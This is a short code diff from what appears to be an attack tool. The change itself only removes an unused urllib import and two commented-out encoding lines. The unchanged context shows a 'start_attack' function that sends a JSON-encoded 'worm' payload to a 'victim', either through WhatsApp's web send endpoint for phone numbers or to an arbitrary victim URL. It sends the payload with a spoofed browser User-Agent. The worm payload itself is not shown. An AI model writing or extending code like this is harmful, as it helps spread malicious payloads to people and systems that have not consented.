@@ -1,5 +1,5 @@
 
-import os, sys, time, urllib, threading
+import os, sys, time, threading
 from socket import *
 import phonenumbers
 import requests
@@ -169,12 +169,10 @@ def start_attack(i,j,k,victim):
 
     if victim[0] == '+':
         url = "https://web.whatsapp.com/send"
-        # worm = urllib.parse.urlencode(worm)
         payload_container = {"phone": victim,"text": json.dumps(worm)}
 
     else:
         url = victim
-        # worm = urllib.parse.urlencode(worm)
         payload_container = {"text": json.dumps(worm),"data": json.dumps(worm)}
     
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.3","Content-Type": "application/json"}
